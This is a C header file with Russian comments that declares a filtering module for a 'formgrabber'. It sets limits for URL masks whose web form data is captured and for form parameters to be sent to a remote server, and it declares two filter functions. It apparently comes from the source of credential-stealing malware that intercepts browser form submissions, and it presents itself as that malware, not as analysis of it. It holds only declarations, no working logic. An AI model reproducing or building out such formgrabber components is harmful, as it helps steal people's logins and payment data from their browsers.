
//---------------------------------------------------------------------------
//  Модуль фильтрации данных формграбера
//  
//	ВАЖНО: Модуль будет подключен к проекту только если его вызов имеется
//         в модуле Modules.h
//---------------------------------------------------------------------------

#ifndef FgrFiltersH
#define FgrFiltersH
//---------------------------------------------------------------------------

#include <windows.h>

//-------------------------------------------------
//  Максимальный размер массива хранения масок
//  адресов с которых принимать данные HTML форм
//-------------------------------------------------
#define FGR_FILTERS_MAX_FILTERS_SIZE 3000

//-------------------------------------------------
//  Максимальный размер массива хранения масок
//  параметров HTML форм, которых необходимо
//  отправлять на сервер
//-------------------------------------------------
#define FGR_FILTERS_MAX_PARAMS_FILTERS_SIZE 1024


//-------------------------------------------------
//  FiltrateFormGrabberURL - Функция возвращает
//  	истину если ссылка поддерживается
//		формграбером
//-------------------------------------------------
bool FiltrateFormGrabberURL(PCHAR URL);


//-------------------------------------------------
//  FiltrateFormGrabberData - функция возвращает
//  	истину если данные прошли фильтрацию
//-------------------------------------------------
bool FiltrateFormGrabberData(const char* Data);


//---------------------------------------------------------------------------
#endif
